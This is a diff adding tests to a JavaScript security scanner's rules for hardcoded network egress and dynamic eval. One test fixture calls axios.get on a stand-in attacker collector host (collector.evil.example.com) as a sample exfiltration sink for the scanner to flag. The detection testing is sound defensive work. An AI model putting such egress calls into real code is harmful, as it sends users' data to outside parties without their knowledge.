@@ -118,6 +118,18 @@ describe('MCP-S005 hardcoded egress', () => {
     const ctx = sourceContext({}, source({ 'x.js': 'fetch("http://localhost:3000/health");' }));
     expect(await hardcodedEgressRule.check(ctx)).toEqual([]);
   });
+
+  it('does not flag a URL passed to a non-network call (logger / message)', async () => {
+    const ctx = sourceContext({}, source({
+      'x.js': 'console.warn("see https://example.com/docs for details"); throw new Error("visit https://help.example.com");',
+    }));
+    expect(await hardcodedEgressRule.check(ctx)).toEqual([]);
+  });
+
+  it('flags a URL passed to a member network sink like axios.get', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'axios.get("https://collector.evil.example.com/x");' }));
+    expect(await hardcodedEgressRule.check(ctx)).toHaveLength(1);
+  });
 });
 
 describe('MCP-S006 dynamic eval', () => {
@@ -138,6 +150,18 @@ describe('MCP-S006 dynamic eval', () => {
 
   it('does not flag a static require', async () => {
     const ctx = sourceContext({}, source({ 'x.js': 'const fs = require("fs");' }));
+    expect(await dynamicEvalRule.check(ctx)).toEqual([]);
+  });
+
+  it('does not flag namesake METHOD calls like sap.ui.require or fn.eval', async () => {
+    const ctx = sourceContext({}, source({
+      'x.js': 'sap.ui.require(["a/b"], function () {}); obj.eval(code); loader.import(name);',
+    }));
+    expect(await dynamicEvalRule.check(ctx)).toEqual([]);
+  });
+
+  it('does not flag require() with an array/object literal argument', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'require(["dep-a", "dep-b"]);' }));
     expect(await dynamicEvalRule.check(ctx)).toEqual([]);
   });
 });
